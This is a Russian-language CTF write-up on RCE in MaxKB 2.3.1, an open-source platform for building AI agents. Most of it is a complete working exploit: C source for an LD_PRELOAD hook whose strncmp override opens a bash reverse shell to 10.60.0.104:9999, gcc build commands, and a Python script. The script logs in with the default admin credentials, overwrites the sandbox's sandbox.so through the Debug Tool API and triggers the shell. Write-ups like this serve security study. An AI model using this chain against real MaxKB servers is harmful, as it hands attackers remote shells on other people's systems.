# RootKB
**RCTF 2025**

В первой версии задания был дан только Dockerfile:
```
FROM 1panel/maxkb:v2.3.1
COPY flag /root/flag
```
И учетка `admin / MaxKB@123..`. [MaxKB](https://github.com/1Panel-dev/MaxKB) - это опенсорсная песочница для создания AI агентов. Недавно в ней нашли несколько CVE, позволяющих исполнять код. PoC или подробного описания для них в открытом доступе не было, поэтому участникам RCTF нужно было самостоятельно найти эти CVE.
Однако, разработчики таска ошиблись: CVE были найдены для версии `2.3.0`, а в задании использовалась версия `2.3.1` с уже исправленными багами.
Так CTF превратился в мини-багбаунти и участники нашли еще парочку CVE в новой версии.

## Перезапись `sandbox.so` (уже пофиксили)

Для испрваления CVE в MaxKB `2.3.1` добавили бинарь `sandbox.so`, который должен был ограничивать выполнение Python кода в песочнице. Но на него забыли выставить корректные права, поэтому его можно было просто перезаписать и таким образом достичь RCE. Основная идея в перезаписи переменной LD_PRELOAD и перехвате вызова комад, которые доступны нашему пользователю в песочнице (например, `ls`). Мы можем заменить бинарь `ls` на свой и затем вызвать его через Debug Tool в MaxKB. Ниже пример кода для проброса reverse shell:

### ls_sandbox.c
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void payload() {
    system("bash -c 'bash -i >& /dev/tcp/10.60.0.104/9999 0>&1'");
}

int strncmp(const char* __s1, const char* __s2, size_t __n) {
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    payload();

    return 0;
}
```

### Собираем бинарь:
```
gcc -c -fPIC ls_sandbox.c
gcc -shared -o ls_sandbox.so ls_sandbox.o
```

### Загружкаем `ls_sandbox.so` на сервер с MaxKB и пытаемся его вызвать:
```
import requests
import json
import sys
import os
import base64
import textwrap

TARGET_URL = "http://0.0.0.0:8888"
USERNAME = "admin"
PASSWORD = "MaxKB@123.."

API_BASE = f"{TARGET_URL}/admin/api"
TOOL_DEBUG_API = f"{API_BASE}/workspace/default/tool/debug"

session = requests.session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Content-Type': 'application/json',
    'Accept': 'application/json'
})


def login():
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "captcha": ""
    }
    login_api = f"{API_BASE}/user/login"

    try:
        resp = session.post(login_api, json=login_data)
        if resp.status_code == 200:
            result = resp.json()
            if 'data' in result and result['data'] and 'token' in result['data']:
                token = result['data']['token']
                session.headers['AUTHORIZATION'] = f'Bearer {token}'
                print(f"[+] Login successful!")
                print(f"[+] JWT Token: {token[:50]}...")
                return True
            else:
                print(f"[-] Login failed: {result}")
                return False
        else:
            print(f"[-] Login request failed: {resp.status_code}")
            return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False


def execute_python_code(code):
    """Выполнение Python кода через утилиту debug (функционал MaxKB)"""
    payload = {
        "code": code,
        "input_field_list": [],
        "init_field_list": [],
        "init_params": {},
        "debug_field_list": []
    }

    try:
        resp = session.post(TOOL_DEBUG_API, json=payload)
        if resp.status_code == 200:
            result = resp.json()
            print(result)
            return result.get('data', 'No data returned')
        else:
            return f"HTTP {resp.status_code}: {resp.text}"
    except Exception as e:
        return f"Exception: {e}"


def ls_for_rev_shell():
    """Выполнение ls через Python"""
    code = """import os
os.popen("ls")"""

    return execute_python_code(code)


def write_remote_file(remote_path, b64_content, mode="wb"):
    """
    Записать бинаря на целевом хосте (декодировать из base64)
    :param remote_path: Полный путь к целевому файлу
    :param b64_content: Содержимое файла в base64
    :param mode: Режим файла открытия файла, по умолчанию 'wb'
    """
    code = f"""def write_file():
        import base64
        path = {remote_path!r}
        b64_data = {b64_content!r}
        mode = {mode!r}
        try:
            data = base64.b64decode(b64_data)
            with open(path, mode) as f:
                f.write(data)
            return f"OK: wrote {{len(data)}} bytes to {{path}} with mode={{mode}}"
        except Exception as e:
            return f"Error writing to {{path}}: {{e}}"
        return write_file()"""

    return execute_python_code(code)

def main():
    print("=" * 60)
    print("MaxKB RCE Exploit - Complete Attack Chain")
    print("=" * 60)
    print(f"[+] Target: {TARGET_URL}")
    print(f"[+] Username: {USERNAME}")
    print(f"[+] Exploit endpoint: {TOOL_DEBUG_API}")

    # Логин
    print("\n[+] Step 1: Authentication")
    if not login():
        print("[-] Exploit failed - cannot login")
        return

    # Тест выполнения Python кода
    print("\n[+] Step 2: Remote Code Execution")
    print("\n[*] Testing code execution:")
    code = """def test():
    return "RCE confirmed - Code execution successful!"
    return test()"""
    result = execute_python_code(code)
    print(f"[Result] {result}")

    # Перезапись sandbox.so
    print("\n[+] Step 3: Remote sandbox.so Write")
    test_path = "/opt/maxkb-app/sandbox/sandbox.so"
    with open("ls_sandbox.so", "rb") as f:
        raw = f.read()

    print(raw)

    b64_str = base64.b64encode(raw).decode("ascii")
    result = write_remote_file(test_path, b64_str)
    print(f"[Write Result] {result}")

    # Вызываем ls
    print("\n[*] Execut 'ls' For reverse shell:")
    read_back = ls_for_rev_shell()

if __name__ == "__main__":
    main()
```

## Эксплуатация через `celery`
Пока деталей нет, но по словам участника данный путь работает на обеих версиях `2.3.1` и `2.3.0`

## Оригинальное решение для `2.3.0`
Авторское решение предполагало вызов `chown`. Пока без деталей

#web #maxkb #rce